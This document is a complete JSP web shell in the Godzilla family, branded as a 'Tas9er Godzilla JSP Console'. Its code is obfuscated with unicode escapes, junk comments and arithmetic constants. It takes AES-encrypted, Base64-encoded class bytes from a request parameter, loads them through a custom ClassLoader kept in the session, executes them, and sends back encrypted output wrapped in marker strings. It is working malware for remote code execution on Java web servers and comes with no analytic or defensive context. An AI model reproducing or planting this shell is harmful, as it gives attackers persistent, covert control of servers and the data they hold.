Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_Fcoun = "4a05188c70a6b9af";
    String govsb_UfoFi5Lv4meJX = "Tas9er";
    class govsb_WjZ28H extends /*edusb_TzBWnpNYp*/ClassLoader {
        public govsb_WjZ28H(ClassLoader govsb_YcSIIDrwl) {
            super/*edusb_fx*/(govsb_YcSIIDrwl);
        }
        public Class govsb_9JXqGmyftr0Za(byte[] govsb_r) {
            return super./*edusb_QkHECkBJzh7eG*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_a2jIoWhGsZ3*/(govsb_r, 543661-543661, govsb_r.length);
        }
    }
    public byte[] govsb_Mz(byte[] govsb_ZDC8, boolean govsb_Hrhsyuad) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_1RbVIBWDU5JvEc*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_mMbCj = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_kFFRAlqcsmmqR*/("AES");
            govsb_mMbCj.init(govsb_Hrhsyuad?543661/543661:543661/543661+543661/543661,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_9rAtbUPITJouYIS*/SecretKeySpec/*edusb_Y*/(govsb_Fcoun.getBytes(), "AES"));
            return govsb_mMbCj.doFinal/*edusb_k5N*/(govsb_ZDC8);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_T9 = java.util.Base64./*edusb_G*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_4i*/decode(request.getParameter(govsb_UfoFi5Lv4meJX));
        govsb_T9 = govsb_Mz(govsb_T9,false);
        if (session.getAttribute/*edusb_dVETRqeQmI1pY*/("payload") == null) {
            session.setAttribute("payload", new govsb_WjZ28H(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_oQM8pwBE0SKk*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_qmYc5VPotwZx*/.govsb_9JXqGmyftr0Za(govsb_T9));
        } else {
            request.setAttribute("parameters", govsb_T9);
            java.io.ByteArrayOutputStream govsb_wK = new java.io./*edusb_Y*/ByteArrayOutputStream();
            Object govsb_hZWBVu = /*edusb_7tgHBLs1r*/((Class) session.getAttribute("payload"))./*edusb_W2NisSiOC*//*edusb_2R3osodNYdh*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_xdoXQtT3u9tN*/;
            govsb_hZWBVu.equals(govsb_wK);
            govsb_hZWBVu.equals(pageContext);
            response.getWriter().write("9B7E22BC0D613BE5BB1C6839DDFE5C5F".substring(543661-543661, 16));
            govsb_hZWBVu.toString();
            response.getWriter().write(java.util.Base64/*edusb_UU*/.getEncoder()/*edusb_JoT*/.encodeToString(govsb_Mz(govsb_wK.toByteArray(),true)));
            response.getWriter().write("9B7E22BC0D613BE5BB1C6839DDFE5C5F".substring(16));
        }
    } catch (Exception e) {
    }
%>